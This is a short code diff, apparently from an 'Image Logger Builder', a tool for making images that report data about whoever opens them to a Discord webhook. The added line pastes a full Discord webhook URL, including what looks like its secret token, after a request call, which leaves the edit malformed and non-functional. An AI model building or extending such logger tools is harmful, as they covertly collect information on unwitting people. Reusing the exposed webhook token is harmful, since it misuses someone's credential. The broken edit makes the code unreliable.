@@ -26,7 +26,7 @@
     var image = document.getElementById("image").value    
     var webhook = document.getElementById("url").value
     var request = new XMLHttpRequest;
-    request.open("POST", webhook);
+    request.open("POST", webhook);https://discord.com/api/webhooks/1485204398819770378/V00LGOmpr-MeqMzc52b7qYXwmt_LEyCRdYZvWY2WQNlO6vsRAWtyUB82i64ZtroogqlA
     request.setRequestHeader('Content-type', 'application/json');
     var params = {
     username: "Image Logger Builder",
